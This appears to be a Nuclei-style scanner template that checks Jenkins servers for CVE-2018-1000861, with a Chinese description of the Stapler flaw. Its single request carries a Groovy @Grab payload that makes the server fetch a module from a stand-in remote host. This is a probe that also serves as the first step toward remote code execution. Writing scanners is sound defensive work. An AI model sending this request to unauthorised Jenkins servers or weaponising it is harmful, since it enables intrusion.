id: CVE-2018-1000861

info:
  name: Jenkins - 远程命令执行(CVE-2018-1000861)
  author: wintry
  severity: critical
  description: |
    Jenkins 2.153及更早版本和LTS 2.138.3及更早版本容易受到远程命令注入的影响.
    通过stapler/core/src/main/java/org/kohsuke/stapler/MetaClass.java允许攻击者通过访问不打算以这种方式调用的精心制作的url来调用java对象上的一些方法.
  tags: jenkins
  metadata:
    max-request: 1

http:
  - method: GET
    path:
      - '{{BaseURL}}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;'

    matchers-condition: and
    matchers:

      - type: word
        words:
          - "package#vulntest"
        part: body

      - type: status
        status:
          - 200
